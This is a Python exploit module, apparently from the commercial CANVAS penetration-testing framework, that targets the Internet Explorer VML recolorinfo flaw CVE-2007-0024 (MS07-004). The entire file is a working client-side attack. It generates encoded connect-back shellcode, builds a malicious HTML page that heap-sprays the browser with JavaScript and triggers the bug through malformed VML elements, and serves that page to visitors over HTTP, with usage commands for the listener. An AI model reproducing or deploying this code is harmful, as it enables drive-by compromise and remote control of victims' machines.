#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

NAME='Microsoft Windows VML recolorinfo Bug'
DESCRIPTION='Microsoft Windows VML recolorinfo Bug'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='01/09/07'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS07-004.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-0024'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0024'
DOCUMENTATION['CVSS'] = 9.3

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP'] #2003 not tested yet!
PROPERTY['MSADV']='MS07-004'
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
Exploitation depends on the amount of RAM of the vulnerable machine, and its paging file.
IE 7.0 doesn't do anything on this one, there must be something else in there.

Tested on:
Windows 2000 Server SP4 Enlish with IE 6.0 SP1 UP2DATE
Windows XP Professional SP1a English with IE 6.0 SP1 UP2DATE
Windows XP Professional SP2 English with IE 6.0 SP2 OOTB

Usage:
./commandlineInterface.py -p 5555 -v 9
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ms07_004 -l 10.10.11.1 -d 5555 -p 8080 -O httpmosdef:1
"""

CHANGELOG="""
"""

targets={
    0:['Autodetect',0],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.version=0
        self.badstring='\0\xff'
        self.subesp=0
        self.name=NAME 
        self.filename='test.html'
        return

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def makefile(self):
        filedata="""
<html xmlns:v="urn:schemas-microsoft-com:vml">
<head>
<style>
v\:* {behavior:url(#default#VML);}
</style>
</head>
<script language='javascript'>
sh=unescape('SHELLCODE');
sz=sh.length*2;
npsz=0x400000-(sz+0x38);
nps=unescape('%u0d0d%u0d0d');
while (nps.length*2<npsz) nps+=nps;
ihbc=(0x12000000-0x400000)/0x400000;
mm=new Array();
for (i=0;i<ihbc;i++) mm[i]=nps+sh;
</script>
<v:oval style='position:absolute;top:20;left:20;width:20;height:20'>
""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode)) #'AAAA' is necessary for instructions alignement
        for i in range(255):
            filedata+="<v:recolorinfo recolorstate='t' numcolors='1' numfills='%d'/>\n"%(0x40000000)
        filedata+="<v:recolorinfo recolorstate='t' numcolors='2' numfills='%d'>\n"%(0x40000000)
        for i in range(3):
            #windows 2000 addresses go there: call [ecx+0x10] with ecx being the color (or eax)
            address=0x180370-0x10
            address=struct.unpack('>L',struct.pack('<L',address))[0]>>8
            filedata+="<v:recolorinfoentry recolortype='2570' tocolor='#%06x' fromcolor='#%06x' lbcolor='#%06x'forecolor='#%06x' backcolor='#%06x' bitmaptype='2570' pattern='CCCCCCCCCCCCCCCCCCCCCCCC'/>\n"%(address,address,address,address,address)
        filedata+="""</v:recolorinfo>
</v:rect>
</body>
</html>
"""
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return
        
    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
